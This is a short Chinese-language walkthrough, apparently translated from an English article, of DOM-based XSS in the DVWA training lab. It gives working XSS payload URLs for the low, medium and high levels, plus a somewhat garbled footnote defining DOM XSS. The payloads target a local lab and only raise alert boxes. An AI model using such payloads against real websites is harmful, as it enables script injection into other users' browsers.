## 在DVWA中理解基于DOM的XSS（绕过所有安全性） [^1]

### Low

`//localhost:81/dvwa/vulnerabilities/xss_d/?default=English`

`//localhost:81/dvwa/vulnerabilities/xss_d/?default=English<script>alert("hack");</script>`

### Medium

` //localhost:81/dvwa/vulnerabilities/xss_d/?default=English>/opttion></select><body onload=alert("XSS")>`

### High

`//localhost:81/dvwa/vulnerabilities/xss_d/?default=English#<script>alert("you have been hacked");</script>`

[原文](https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/)

---

[^1]: 基于DOM的跨站点脚本是一种漏洞，它出现在文档对象模型中而不是html页面中。攻击者不允许在用户的网站上执行恶意脚本，虽然在本地机器上的URL，它与反映和XSS完全不同，因为在这种攻击中，开发人员无法在HTML源代码和HTML响应中找到恶意脚本，它可以在执行时观察到。这可能使其比其他攻击更隐蔽，并且正在阅读页面主体的WAF或其他保护措施不会看到任何恶意内容。